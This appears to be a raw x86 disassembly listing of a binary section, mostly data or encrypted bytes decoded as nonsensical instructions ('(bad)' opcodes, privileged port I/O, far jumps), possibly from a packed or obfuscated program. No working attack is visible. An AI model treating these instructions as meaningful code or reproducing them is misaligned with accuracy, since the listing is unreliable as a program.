  4037ba:	lods   al,BYTE PTR ds:[esi]
  4037bb:	call   0xfbcc:0x4bb7d559
  4037c2:	adc    bh,BYTE PTR [ebx-0x13]
  4037c5:	xor    al,0x89
  4037c7:	sbb    al,bl
  4037c9:	in     eax,dx
  4037ca:	mov    esp,0x42694ac1
  4037cf:	push   ebx
  4037d0:	loop   0x403839
  4037d2:	in     eax,dx
  4037d3:	jle    0x40377f
  4037d5:	mov    ecx,0xa9e7821b
  4037da:	and    cl,al
  4037dc:	into   
  4037dd:	jne    0x40384e
  4037df:	dec    edi
  4037e0:	xlat   BYTE PTR ds:[ebx]
  4037e1:	sbb    esi,esp
  4037e3:	mov    ds,WORD PTR cs:[esi]
  4037e6:	jns    0x4037a9
  4037e8:	jg     0x40382a
  4037ea:	das    
  4037eb:	cmp    DWORD PTR [eax+ebp*2-0x4f8956da],edi
  4037f2:	jae    0x4037a2
  4037f4:	xchg   al,ah
  4037f6:	shl    edx,0x74
  4037f9:	mov    edx,0x77a262d5
  4037fe:	push   cs
  4037ff:	xchg   esi,eax
  403800:	(bad)
  403803:	jb     0x403843
  403805:	popa   
  403806:	cs loop 0x403840
  403809:	adc    al,0x1c
  40380b:	xor    esi,DWORD PTR [edx+0x37222f81]
  403811:	pop    es
  403812:	push   esi
  403813:	push   0xffffff94
  403815:	mov    eax,ds:0xd8a3808c
  40381a:	aad    0x6e
  40381c:	outs   dx,DWORD PTR ds:[esi]
  40381d:	xor    eax,0xcca0a232
  403822:	pop    ebp
  403823:	or     eax,DWORD PTR [eax]
  403825:	popf   
  403826:	adc    DWORD PTR [ecx],ebx
  403828:	enter  0xdf1,0x81
  40382c:	in     eax,dx
  40382d:	mov    ah,cl
  40382f:	shl    BYTE PTR ds:0xc4a691fb,1
  403835:	aas    
  403836:	ja     0x403809
  403838:	pop    edx
  403839:	pop    es
  40383a:	out    0x2b,eax
  40383c:	and    ebp,ecx
  40383e:	add    dh,BYTE PTR [esi+0x7c]
  403841:	sub    cl,BYTE PTR [ecx+0x49c3e74d]
  403847:	(bad)  [ebp-0x28]
  40384a:	mov    ecx,0xf1d1e79a
  40384f:	push   DWORD PTR [ebp+0x67]
  403852:	in     al,dx
  403853:	jns    0x40386e
  403855:	mov    bh,0x1f
  403857:	adc    eax,0xb0cff39
  40385c:	(bad)  
  40385d:	mov    edx,0xf0723490
  403862:	inc    esp
  403863:	adc    ch,BYTE PTR [eax+0x41]
  403866:	call   0xf627447e
  40386b:	shr    BYTE PTR [ecx+0x2f95973a],1
  403871:	push   cs
  403872:	xchg   edx,eax
  403873:	scas   al,BYTE PTR es:[edi]
  403874:	les    edx,FWORD PTR [ebp+0x2d081c47]
  40387a:	and    al,0x26
  40387c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40387d:	stos   BYTE PTR es:[edi],al
  40387e:	mov    edx,cs
  403880:	fs pop edx
  403882:	fadd   DWORD PTR [edi-0x102a20cc]
  403888:	loop   0x40382e
  40388a:	jmp    eax
  40388c:	push   esi
  40388d:	mov    bh,0xed
  40388f:	out    dx,eax
  403890:	mov    dh,0xdb
  403892:	adc    BYTE PTR [eax-0x4b34d7c],al
  403898:	adc    esp,esp
  40389a:	das    
  40389b:	jecxz  0x40381d
  40389d:	loope  0x403868
  40389f:	mov    ebx,0x7340b740
  4038a4:	sub    DWORD PTR [ebx+0x4a7bbb08],0xb8a6c493
  4038ae:	mov    ds:0xec36cd8a,al
  4038b3:	fild   WORD PTR [esi]
  4038b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038b6:	out    0xca,eax
  4038b8:	dec    edi
  4038b9:	jae    0x403866
  4038bb:	cli    
  4038bc:	test   bh,ch
  4038be:	test   dl,cl
  4038c0:	mov    al,BYTE PTR [eax+ecx*1]
  4038c3:	jmp    0x403b62
  4038c8:	into   
  4038c9:	rol    esi,cl
  4038cb:	ror    ecx,0xd9
  4038ce:	(bad)  
  4038d0:	mov    ebp,0x92d405f3
  4038d5:	cwde   
  4038d6:	in     eax,dx
  4038d7:	adc    eax,0x78781d14
  4038dc:	(bad)  
  4038dd:	jle    0x403957
  4038df:	js     0x4038d5
  4038e1:	adc    eax,0x377bfbb2
  4038e6:	mov    bh,0xa0
  4038e8:	dec    eax
  4038e9:	or     ch,bl
  4038eb:	bound  edi,QWORD PTR [ebx-0x3]
  4038ee:	leave  
  4038ef:	arpl   WORD PTR [eax+0x717ea284],di
  4038f5:	into   
  4038f6:	test   BYTE PTR [edx+edi*4+0x17cde101],ch
  4038fd:	test   DWORD PTR [edi+0x1028922b],ebx
  403903:	shr    esp,0xa8
  403906:	ins    DWORD PTR es:[edi],dx
  403907:	mov    ds:0xc1ac4b63,eax
  40390c:	bnd jne 0x4038a4
  40390f:	pop    ds
  403910:	psrlw  mm1,QWORD PTR [esi+eax*1-0x425428e7]
  403918:	shr    BYTE PTR [ebx],0xd7
  40391b:	in     al,dx
  40391c:	jae    0x4038b8
  40391e:	jp     0x403911
  403920:	in     al,0x55
  403922:	dec    ecx
  403923:	aas    
  403924:	push   esi
  403925:	pop    edx
  403926:	adc    esp,ebp
  403928:	adc    al,BYTE PTR [ecx+0x7]
  40392b:	dec    ebp
  40392c:	in     al,dx
  40392d:	jns    0x403968
  40392f:	mov    ds:0x21bbad59,al
  403934:	aaa    
  403935:	jns    0x4038e1
  403937:	xlat   BYTE PTR ds:[ebx]
  403938:	loope  0x4038da
  40393a:	jg     0x4038dd
  40393c:	pop    ss
  40393d:	cmp    BYTE PTR [edx],bl
  40393f:	cli    
  403940:	cwde   
  403941:	dec    esp
  403942:	sbb    eax,0x611ed58b
  403947:	lock pop eax
  403949:	xor    eax,DWORD PTR [ebx+0x7e]
  40394c:	maxps  xmm1,xmm0
  40394f:	sbb    al,0xe7
  403951:	sti    
  403952:	call   0xac949b6c
  403957:	cmp    BYTE PTR [ebx+0x17b19b84],0x62
  40395e:	lods   al,BYTE PTR fs:[esi]
  403960:	adc    ebp,DWORD PTR [esi+0x18]
  403963:	shl    DWORD PTR [ebx-0x6d87d662],cl
  403969:	push   esp
  40396a:	inc    esp
  40396b:	(bad)  
  40396c:	jne    0x403990
  40396e:	mov    ecx,0x1f3638f2
  403973:	stc    
  403974:	or     DWORD PTR ss:0x12288ff9,edx
  40397b:	into   
  40397c:	into   
  40397d:	sbb    edi,DWORD PTR [esi]
  40397f:	pusha  
  403980:	test   DWORD PTR [ebx-0x2c],ebp
  403983:	data16 je 0x4039b8
  403986:	js     0x4039b5
  403988:	and    ah,BYTE PTR [ebx]
  40398a:	loope  0x403998
  40398c:	or     al,BYTE PTR [ebp-0x30]
  40398f:	pop    ecx
  403990:	push   esi
  403991:	pusha  
  403992:	mov    ch,0xb5
  403994:	rcl    BYTE PTR [edi-0x28],1
  403997:	mov    bl,ch
  403999:	jb     0x403929
  40399b:	call   0x9c16:0xc1e74021
  4039a2:	or     al,0xe1
  4039a4:	pop    es
  4039a5:	retf   
  4039a6:	xor    eax,0x57657501
  4039ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039ac:	mov    dh,0xba
  4039ae:	cs cld 
  4039b0:	in     al,dx
  4039b1:	dec    esp
  4039b2:	push   ecx
  4039b3:	fdiv   QWORD PTR [edx]
  4039b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039b6:	mov    ch,0x81
  4039b8:	mov    bl,0xd3
  4039ba:	or     BYTE PTR [ebx+0x4636ad8e],0x27
  4039c1:	mov    eax,ds:0xfa3f7eda
  4039c6:	jbe    0x4039e8
  4039c8:	inc    eax
  4039c9:	mov    ds:0x280ae4e0,eax
  4039ce:	add    dh,al
  4039d0:	jbe    0x40395a
  4039d2:	(bad)  
  4039d3:	dec    esi
  4039d4:	mov    WORD PTR [ebp+0x356c53eb],ds
  4039da:	leave  
  4039db:	sub    BYTE PTR [bx-0x7c],ah
  4039df:	inc    edi
  4039e0:	neg    BYTE PTR [ecx-0x5]
  4039e3:	jne    0x4039be
  4039e5:	fadd   DWORD PTR [ecx]
  4039e7:	xchg   esi,eax
  4039e8:	cli    
  4039e9:	dec    edx
  4039ea:	das    
  4039eb:	inc    esp
  4039ec:	jmp    0x27d3:0x53a9f9cc
  4039f3:	push   esi
  4039f4:	sub    eax,0x15e58a7e
  4039f9:	push   ebp
  4039fa:	push   ecx
  4039fb:	pop    ecx
  4039fc:	stos   BYTE PTR es:[edi],al
  4039fd:	and    al,0x43
  4039ff:	stc    
  403a00:	(bad)  
  403a01:	cmp    ebp,DWORD PTR [ebx-0x6b]
  403a04:	mov    DWORD PTR [ebx+0x6ed10541],ebx
  403a0a:	loope  0x4039e8
  403a0c:	mov    edi,0x547cca7a
  403a11:	pusha  
  403a12:	retf   0x4235
  403a15:	or     eax,0x1adcaa87
  403a1a:	mov    esp,0xca183dbc
  403a1f:	mov    al,ds:0x4fb4abaf
  403a24:	or     BYTE PTR [ecx+0x1a7036d6],0x48
  403a2b:	(bad)  
  403a2c:	or     edx,ecx
  403a2e:	call   0x67056167
  403a33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a35:	mov    ebp,0xe1ff024
  403a3a:	les    esp,FWORD PTR [ebp+0x5fd48745]
  403a40:	pop    esi
  403a41:	cwde   
  403a42:	ja     0x403a1a
  403a44:	pop    es
  403a45:	dec    esp
  403a46:	mov    al,0x6
  403a48:	gs in  al,0xfd
  403a4b:	loopne 0x403a91
  403a4d:	jmp    0x403ac0
  403a4f:	jl     0x4039f9
  403a51:	add    BYTE PTR [edi-0x6a9b9638],bh
  403a57:	popa   
  403a58:	shl    BYTE PTR [ecx-0x78],1
  403a5b:	mov    ds:0x1536e93,eax
  403a60:	inc    ebp
  403a61:	dec    edi
  403a62:	dec    ecx
  403a63:	add    DWORD PTR [ecx+0x9],esp
  403a66:	fcomp  QWORD PTR [esi+0x3f]
  403a69:	cdq    
  403a6a:	call   0xa1382cf2
  403a6f:	imul   eax,DWORD PTR [ebp-0x24d2adb5],0xffffffe4
  403a76:	xchg   DWORD PTR [edx-0x465e22bc],eax
  403a7c:	push   0xd
  403a7e:	adc    edi,DWORD PTR [ebp+0x43]
  403a81:	icebp  
  403a82:	pushf  
  403a83:	lods   al,BYTE PTR ds:[esi]
  403a84:	call   0x1717:0x267eebfa
  403a8b:	imul   ecx,edx,0xffffffff
  403a8e:	data16 int 0x6a
  403a91:	in     eax,dx
  403a92:	clc    
  403a93:	lods   eax,DWORD PTR ds:[esi]
  403a94:	add    eax,0x4a7b0048
  403a99:	rcr    BYTE PTR [edi+ebp*2-0x7e],1
  403a9d:	mov    ebp,0xa9a930
  403aa2:	imul   ebp,DWORD PTR [eax+0x4946c068],0xf
  403aa9:	inc    eax
  403aaa:	sbb    eax,0x8fcfefb6
  403aaf:	sbb    al,BYTE PTR ds:0x88013797
  403ab5:	cli    
  403ab6:	cli    
  403ab7:	mov    ah,0x76
  403ab9:	xchg   ebx,eax
  403aba:	cmc    
  403abb:	das    
  403abc:	fistp  WORD PTR [ebp+ebx*1-0x31]
  403ac0:	cmp    BYTE PTR [edx],dh
  403ac2:	xor    al,0xed
  403ac4:	or     al,0x5a
  403ac6:	shr    BYTE PTR [eax+ebx*1+0x53],1
  403aca:	mov    bl,0xdc
  403acc:	dec    DWORD PTR [edi+0x14ce6ab7]
  403ad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ad3:	std    
  403ad4:	test   DWORD PTR [ebp-0x77],0x66448ebb
  403adb:	cmp    dl,ch
  403add:	pop    eax
  403ade:	mov    esp,0x8eced24a
  403ae3:	fmul   st(1),st
  403ae5:	pop    ss
  403ae6:	lock int3 
  403ae8:	mul    al
  403aea:	outs   dx,DWORD PTR ds:[esi]
  403aeb:	imul   ecx,DWORD PTR [ebp+0x37],0x7
  403aef:	fisttp WORD PTR [esi]
  403af1:	cmp    eax,0x50ffc002
  403af6:	or     eax,0xa03d603a
  403afb:	xor    DWORD PTR [eax],edi
  403afd:	mov    eax,0x741f88e7
  403b02:	out    0xdb,al
  403b04:	dec    esi
  403b05:	mov    dh,BYTE PTR [ebp+ebx*1+0x797edde7]
  403b0c:	push   edi
  403b0d:	xchg   BYTE PTR [edi],al
  403b0f:	jns    0x403ad5
  403b11:	pop    eax
  403b12:	js     0x403b0f
  403b14:	mov    eax,0x3c4e4765
  403b19:	dec    eax
  403b1a:	(bad)  
  403b1b:	mov    edx,0x9600742a
  403b20:	or     BYTE PTR [esi-0x7b],bh
  403b23:	stos   BYTE PTR es:[edi],al
  403b24:	xchg   edx,eax
  403b25:	mov    cl,0x90
  403b27:	jnp    0x403b14
  403b29:	push   0xc1698b9d
  403b2e:	add    BYTE PTR [esi+0x1d],bh
  403b31:	xchg   ebp,eax
  403b32:	stos   BYTE PTR es:[edi],al
  403b33:	stos   DWORD PTR es:[edi],eax
  403b34:	dec    edx
  403b35:	into   
  403b36:	jmp    0xf17ccf6a
  403b3b:	sbb    al,0x83
  403b3d:	test   eax,0x70203ded
  403b42:	out    0x84,al
  403b44:	in     al,dx
  403b45:	or     dh,al
  403b47:	add    cl,BYTE PTR [eax+edx*1-0x6]
  403b4b:	outs   dx,BYTE PTR ds:[esi]
  403b4c:	imul   edi,DWORD PTR [ebx],0x58
  403b4f:	lods   eax,DWORD PTR ds:[esi]
  403b50:	xchg   BYTE PTR [ebp*8-0x3c3f58f6],ch
  403b57:	push   cs
  403b58:	jne    0x403afe
  403b5a:	mov    edx,0x9111eab3
  403b5f:	out    0xf8,al
  403b61:	add    eax,DWORD PTR [ebx+edi*1]
  403b64:	xor    al,0x43
  403b66:	cmp    al,0xc5
  403b68:	je     0x4040bd
  403b6e:	jmp    0x403e0d
  403b73:	leave  
  403b74:	rol    dl,cl
  403b76:	rcr    ecx,cl
  403b78:	rcr    ecx,cl
  403b7a:	(bad)  
  403b7c:	ss push edx
  403b7e:	fwait
  403b7f:	mov    es,WORD PTR [edi+0x239a0147]
  403b85:	js     0x403bff
  403b87:	(bad)  
  403b88:	jle    0x403c02
  403b8a:	js     0x403bc4
  403b8c:	sub    dl,cl
  403b8e:	sub    esp,DWORD PTR [edx+0x378987ec]
  403b94:	dec    eax
  403b95:	push   eax
  403b96:	rcl    BYTE PTR [eax+esi*1+0x31],1
  403b9a:	push   es
  403b9b:	adc    BYTE PTR [ecx+edx*2-0x694ab0fd],dh
  403ba2:	xor    edi,DWORD PTR [esi-0x5e]
  403ba5:	pop    eax
  403ba6:	repnz retf 0x67
  403baa:	adc    eax,0x88579e1c
  403baf:	jbe    0x403c1f
  403bb1:	ins    DWORD PTR es:[edi],dx
  403bb2:	mov    ecx,0x652a9ccf
  403bb7:	xchg   ebx,edi
  403bb9:	push   es
  403bba:	loop   0x403bec
  403bbc:	nop
  403bbd:	out    0x25,al
  403bbf:	and    esi,DWORD PTR [ebp+0x7262f147]
  403bc5:	cmp    eax,0x8f7568d0
  403bca:	cmp    BYTE PTR [ecx+0x5d],bl
  403bcd:	cmp    DWORD PTR [ebp-0x80],esp
  403bd0:	imul   ebp,DWORD PTR [ebx],0x806f2423
  403bd6:	lds    ecx,FWORD PTR [ebx]
  403bd8:	adc    eax,0x94fdd67
  403bdd:	pop    edx
  403bde:	ss int 0x70
  403be1:	mov    ebp,0xdeeafa33
  403be6:	mov    cs,WORD PTR [edi-0x7e]
  403be9:	adc    al,bl
  403beb:	mov    ss,WORD PTR [ebp-0x18]
  403bee:	jge    0x403bf8
  403bf0:	xchg   edi,eax
  403bf1:	mov    ch,0xb1
  403bf3:	fbstp  TBYTE PTR [eax+ebp*2-0x3]
  403bf7:	cmp    eax,DWORD PTR [ebx]
  403bf9:	out    dx,al
  403bfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bfb:	jns    0x403b8a
  403bfd:	or     BYTE PTR [ecx],ch
  403bff:	adc    DWORD PTR [edi-0x34],ebx
  403c02:	xor    eax,0x8f170544
  403c07:	pushf  
  403c08:	mov    dl,0x8
  403c0a:	fwait
  403c0b:	loope  0x403be4
  403c0d:	cmp    eax,0x76d4ed7e
  403c12:	nop
  403c13:	sbb    DWORD PTR [esi-0x5e],0xb7a49de9
  403c1a:	push   DWORD PTR cs:[eax+0x16fbe1c0]
  403c21:	jmp    0x403bee
  403c23:	pusha  
  403c24:	mov    dl,0x49
  403c26:	popf   
  403c27:	and    ch,dh
  403c29:	pop    ecx
  403c2a:	push   0xfb4adc80
  403c2f:	fnstcw WORD PTR [eax-0x62]
  403c32:	outs   dx,DWORD PTR ds:[esi]
  403c33:	and    al,0xc6
  403c35:	push   esi
  403c36:	cmp    eax,0x9bf0ecf4
  403c3b:	bound  ebp,QWORD PTR [edi]
  403c3d:	(bad)
  403c41:	loopne 0x403bc5
  403c43:	push   cs
  403c44:	retf   0x4bd7
  403c47:	leave  
  403c48:	retf   0xa961
  403c4b:	cmp    ebx,esi
  403c4d:	stos   BYTE PTR es:[edi],al
  403c4e:	(bad)  [eax+eiz*8+0x8fb2359]
  403c55:	pusha  
  403c56:	push   ecx
  403c57:	fucompp 
  403c59:	pop    es
  403c5a:	loope  0x403c93
  403c5c:	inc    esi
  403c5d:	data16 and dl,ch
  403c60:	mov    dh,0xc8
  403c62:	pop    edi
  403c63:	repz popf 
  403c65:	jno    0x403c45
  403c67:	mov    ch,bl
  403c69:	out    0x4f,al
  403c6b:	add    BYTE PTR [edx+0x6406697a],ah
  403c71:	fnstcw WORD PTR [esi+ebp*2]
  403c74:	fstp   QWORD PTR [ebx-0x51]
  403c77:	push   esi
  403c78:	jns    0x403c6b
  403c7a:	aam    0xb4
  403c7c:	xchg   edx,eax
  403c7d:	add    BYTE PTR [edx+eax*1+0x76],al
  403c81:	mov    ebx,DWORD PTR [edi]
  403c83:	xchg   ebx,eax
  403c84:	pop    ebx
  403c85:	xor    DWORD PTR [esi+ebx*8+0x67],edx
  403c89:	(bad)  
  403c8a:	jno    0x403ce0
  403c8c:	stos   DWORD PTR es:[edi],eax
  403c8d:	iret   
  403c8e:	push   edx
  403c8f:	xchg   edi,eax
  403c90:	loopne 0x403cd5
  403c92:	inc    edi
  403c93:	lock test al,0xba
  403c96:	mov    al,BYTE PTR ds:0x9d79d4a
  403c9c:	xor    al,0xf4
  403c9e:	xchg   ecx,eax
  403c9f:	push   ds
  403ca0:	lahf   
  403ca1:	push   esp
  403ca2:	stc    
  403ca3:	rcr    DWORD PTR [edi+0x6a95216b],0xeb
  403caa:	pop    edx
  403cab:	stos   DWORD PTR es:[edi],eax
  403cac:	sahf   
  403cad:	mov    eax,esp
  403caf:	xlat   BYTE PTR ds:[ebx]
  403cb0:	mov    bh,0xf
  403cb2:	in     al,0xfd
  403cb4:	sub    eax,0x2056f0b5
  403cb9:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  403cbb:	call   0xf614e0a4
  403cc0:	add    bl,dh
  403cc2:	test   al,0x53
  403cc4:	outs   dx,DWORD PTR ds:[esi]
  403cc5:	shl    BYTE PTR [ebx+0x78],0xf0
  403cc9:	xor    al,0xdd
  403ccb:	pop    ebx
  403ccc:	push   ebp
  403ccd:	repz sub ebx,edx
  403cd0:	jge    0x403c56
  403cd2:	mov    ch,0x5d
  403cd4:	outs   dx,DWORD PTR ds:[esi]
  403cd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cd6:	sahf   
  403cd7:	(bad)  
  403cd8:	dec    edx
  403cd9:	jmp    0xd106:0x41b8577c
  403ce0:	ins    BYTE PTR es:[edi],dx
  403ce1:	clc    
  403ce2:	sub    al,0x72
  403ce4:	or     BYTE PTR [ebp+0x59088665],dl
  403cea:	rol    BYTE PTR [ebx-0x71],0xf9
  403cee:	aad    0x61
  403cf0:	adc    BYTE PTR [edx-0x6],0x2e
  403cf4:	push   eax
  403cf5:	jmp    0x403c81
  403cf7:	jmp    0xe89e80d6
  403cfc:	jo     0x403d4d
  403cfe:	add    ebx,DWORD PTR [ebp-0x4d94792c]
  403d04:	mov    ebx,0xf47be21a
  403d09:	jmp    0x403c8c
  403d0b:	ds inc ecx
  403d0d:	mov    eax,0x93ad05c0
  403d12:	cwde   
  403d13:	jns    0x403c98
  403d15:	ror    dh,cl
  403d17:	fisub  DWORD PTR fs:[edx]
  403d1a:	je     0x403d81
  403d1c:	sbb    al,0x9f
  403d1e:	push   ecx
  403d1f:	adc    edx,esp
  403d21:	iret   
  403d22:	int3   
  403d23:	scas   eax,DWORD PTR es:[edi]
  403d24:	aaa    
  403d25:	sbb    eax,esi
  403d27:	test   al,0x82
  403d29:	ss jmp 0x403d06
  403d2c:	sbb    DWORD PTR [ecx+0x46],0xffffffe9
  403d30:	pop    eax
  403d31:	fadd   DWORD PTR ds:[ebx+0x3ac4b340]
  403d38:	mov    edi,0xbf1ae52e
  403d3d:	jmp    DWORD PTR [ecx-0x3d]
  403d40:	dec    edi
  403d41:	aad    0x49
  403d43:	adc    DWORD PTR [ebx+edi*2],eax
  403d46:	cli    
  403d47:	adc    bl,BYTE PTR [eax]
  403d49:	fsubr  DWORD PTR [ecx]
  403d4b:	retf   0x13a6
  403d4e:	push   DWORD PTR [eax]
  403d50:	xor    DWORD PTR [ecx-0x53],ecx
  403d53:	mov    ecx,0x64338b2e
  403d58:	ret    
  403d59:	stos   BYTE PTR es:[edi],al
  403d5a:	mov    eax,ds:0x2646673d
  403d5f:	dec    edx
  403d60:	mov    dl,0xa7
  403d62:	lods   al,BYTE PTR ds:[esi]
  403d63:	dec    esp
  403d64:	sub    bh,dh
  403d66:	jbe    0x403d70
  403d68:	jmp    0x2601b563
  403d6d:	push   es
  403d6e:	push   ds
  403d6f:	retf   0x9ca3
  403d72:	lahf   
  403d73:	scas   al,BYTE PTR es:[edi]
  403d74:	pop    esp
  403d75:	jne    0x403cfb
  403d77:	sbb    eax,0xd400ba22
  403d7c:	iret   
  403d7d:	dec    eax
  403d7e:	dec    ecx
  403d7f:	pop    edx
  403d80:	pop    ebx
  403d81:	pop    esi
  403d82:	add    bh,bh
  403d84:	or     DWORD PTR [ebp+edi*1-0x4cc4a6c9],edx
  403d8b:	jle    0x403d53
  403d8d:	jae    0x403d26
  403d8f:	jmp    0x403d72
  403d91:	jmp    0x403d76
  403d93:	call   0x17471550
  403d98:	bound  ecx,QWORD PTR [esi]
  403d9a:	xlat   BYTE PTR ds:[ebx]
  403d9b:	xchg   ebx,eax
  403d9c:	ja     0x403dbc
  403d9e:	fnsave [ecx-0x56]
  403da1:	int    0x1
  403da3:	loop   0x403de0
  403da5:	add    eax,0x789d2e60
  403daa:	imul   ebp,DWORD PTR [edi+0x695b8707],0x19
  403db1:	add    edx,DWORD PTR [edi]
  403db3:	mov    esi,0xa86a443e
  403db8:	xor    BYTE PTR [eax],bh
  403dba:	ret    
  403dbb:	xor    eax,0x6a1078d3
  403dc0:	xor    ebx,ecx
  403dc2:	mov    esi,0xe64b433d
  403dc7:	xchg   edx,eax
  403dc8:	repz xchg ebx,eax
  403dca:	add    ebp,DWORD PTR [ecx+0x47]
  403dcd:	rcr    bh,1
  403dcf:	(bad)  
  403dd0:	fisttp WORD PTR [edx+eax*4+0x6e63cad7]
  403dd7:	and    ebx,0x76
  403dda:	or     DWORD PTR [edi],ebx
  403ddc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ddd:	cmp    BYTE PTR [ebp+0x4c90a709],0x8e
  403de4:	fnstenv [ecx]
  403de6:	dec    esi
  403de7:	shr    BYTE PTR [edi+0x5e],0x2e
  403deb:	push   esi
  403dec:	fs (bad) 
  403dee:	out    0xd5,eax
  403df0:	cmp    esp,DWORD PTR [esp+edi*1-0x65]
  403df4:	mov    ds:0xbf8c76bf,al
  403df9:	xchg   DWORD PTR [ebx],edx
  403dfb:	xor    BYTE PTR [edi+ebp*4+0x2c],0x4
  403e00:	retf   0x7dd8
  403e03:	jp     0x403e44
  403e05:	es dec ebx
  403e07:	xor    ch,BYTE PTR cs:[ebx]
  403e0a:	out    dx,al
  403e0b:	mov    ch,0xe7
  403e0d:	mov    eax,DWORD PTR [ebp+0x8]
  403e10:	mov    ecx,DWORD PTR [ebp-0x8]
  403e13:	xor    eax,esi
  403e15:	add    eax,edi
  403e17:	mov    DWORD PTR [ecx],eax
  403e19:	jmp    0x404380
  403e1e:	jmp    0x4040bd
  403e23:	ds retf 0xcdca
  403e27:	retf   0xd9cd
  403e2a:	fldenv ds:0xb9dd8593
  403e30:	jno    0x403db8
  403e32:	xlat   BYTE PTR ds:[ebx]
  403e33:	sbb    BYTE PTR [eax],ah
  403e35:	js     0x403eaf
  403e37:	(bad)  
  403e38:	jle    0x403eb2
  403e3a:	js     0x403df6
  403e3c:	dec    esp
  403e3d:	(bad)  
  403e3e:	cld    
  403e3f:	mov    edi,0x21f494b
  403e44:	in     al,dx
  403e45:	and    dh,BYTE PTR [ebp-0x725df3e8]
  403e4b:	in     al,0x18
  403e4d:	mov    esp,0xf79de1c3
  403e52:	add    BYTE PTR [edx-0x4a],0x15
  403e56:	and    al,0x32
  403e58:	idiv   BYTE PTR [ecx+ecx*2-0x3c]
  403e5c:	das    
  403e5d:	sbb    eax,0x3db1e249
  403e62:	or     edx,DWORD PTR [eax]
  403e64:	or     DWORD PTR [ebx+0x5f],0xffffffca
  403e68:	pop    edx
  403e69:	sbb    bh,BYTE PTR [edx]
  403e6b:	bound  edi,QWORD PTR [ebp-0x2d]
  403e6e:	outs   dx,DWORD PTR ds:[esi]
  403e6f:	and    al,0xa3
  403e71:	or     dh,ch
  403e73:	mov    ch,0x25
  403e75:	in     eax,0x3
  403e77:	inc    edi
  403e78:	pop    edx
  403e7a:	or     esp,eax
  403e7c:	cdq    
  403e7d:	add    eax,DWORD PTR [edx+edi*1]
  403e80:	ret    
  403e81:	mov    dl,BYTE PTR [edi]
  403e83:	std    
  403e84:	or     esi,eax
  403e86:	or     al,0x32
  403e88:	xor    ch,BYTE PTR [edi+eax*2+0x1f]
  403e8c:	pop    ss
  403e8d:	scas   al,BYTE PTR es:[edi]
  403e8e:	cmp    edx,esi
  403e90:	sbb    DWORD PTR [ecx+0x4d],ecx
  403e93:	aaa    
  403e94:	push   esp
  403e95:	mov    ah,0xf
  403e97:	lea    esp,[eax-0x6e]
  403e9a:	sub    eax,0xb2219073
  403e9f:	cmp    ebp,DWORD PTR [esi+0x10bb089e]
  403ea5:	pusha  
  403ea6:	into   
  403ea7:	fist   DWORD PTR [ebx-0x12542b5d]
  403ead:	adc    edx,DWORD PTR [eax-0x7b]
  403eb0:	fwait
  403eb1:	push   es
  403eb2:	pop    ecx
  403eb3:	enter  0x2128,0x9d
  403eb7:	outs   dx,BYTE PTR ds:[esi]
  403eb8:	xchg   esi,eax
  403eb9:	mov    bh,0xb3
  403ebb:	pop    ecx
  403ebc:	pop    ebx
  403ebd:	jb     0x403e7e
  403ebf:	sub    BYTE PTR [ecx],0x3f
  403ec2:	and    edx,DWORD PTR [ebp+0x5]
  403ec5:	fsubr  DWORD PTR ds:0x849c4da1
  403ecb:	lods   eax,DWORD PTR ds:[esi]
  403ecc:	jmp    0x5a98:0x26286e0d
  403ed3:	jnp    0x403e7a
  403ed5:	ja     0x403f32
  403ed7:	rcr    esp,cl
  403ed9:	std    
  403eda:	ror    DWORD PTR [ebp+0x6a],1
  403edd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ede:	in     eax,dx
  403edf:	fnop   
  403ee1:	push   ss
  403ee2:	scas   eax,DWORD PTR es:[edi]
  403ee3:	subps  xmm4,XMMWORD PTR [esi-0x72]
  403ee7:	pop    es
  403ee8:	(bad)  
  403ee9:	xor    eax,0x3ef7a3a5
  403eee:	in     al,0xf7
  403ef0:	jae    0x403f48
  403ef2:	cwde   
  403ef3:	bound  ebp,QWORD PTR [ebx+ebx*4]
  403ef6:	adc    BYTE PTR [eax+0x79],dh
  403ef9:	push   esi
  403efa:	test   eax,0x22446dbc
  403eff:	mov    esp,0x90682f38
  403f04:	scas   eax,DWORD PTR es:[edi]
  403f05:	lea    ebx,[edi-0x1641cd15]
  403f0b:	arpl   WORD PTR [edx],bp
  403f0d:	popa   
  403f0e:	shl    DWORD PTR [eax-0x6b7d2db3],0xb3
  403f15:	jnp    0x403efc
  403f17:	pop    ecx
  403f18:	int    0xaa
  403f1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f1b:	mov    bl,0x18
  403f1d:	xchg   esi,eax
  403f1e:	fbstp  TBYTE PTR [edx-0x67]
  403f21:	mov    ebx,0xf38d70a0
  403f26:	jmp    0x403ec2
  403f28:	add    DWORD PTR [ebp-0x46],esi
  403f2b:	dec    eax
  403f2c:	xor    BYTE PTR [edi],ah
  403f2e:	mov    ch,0x57
  403f30:	dec    edx
  403f31:	jae    0x403ecc
  403f33:	push   ss
  403f34:	push   edi
  403f35:	push   edi
  403f36:	imul   ebp,DWORD PTR ds:0xccbf26ae,0xffffffde
  403f3d:	add    BYTE PTR [eax-0x5d],0xd1
  403f41:	cmp    ebp,eax
  403f43:	jmp    0x361e56f2
  403f48:	xchg   edi,eax
  403f49:	push   ds
  403f4a:	adc    ecx,DWORD PTR [edx+0x4a]
  403f4d:	cdq    
  403f4e:	pop    ds
  403f4f:	enter  0xe0ef,0x4c
  403f53:	fistp  WORD PTR [ebx+0x5a]
  403f56:	test   DWORD PTR [ebx],ebp
  403f58:	in     al,dx
  403f59:	cmp    BYTE PTR [esi],ch
  403f5b:	mov    al,ds:0x60603879
  403f60:	stos   BYTE PTR es:[edi],al
  403f61:	dec    esp
  403f62:	ficom  DWORD PTR ds:0x6c13cbf5
  403f68:	imul   ebx,DWORD PTR [esi*2+0x6f830f49],0x7e
  403f70:	xor    DWORD PTR [edx],ebx
  403f72:	repnz dec ebx
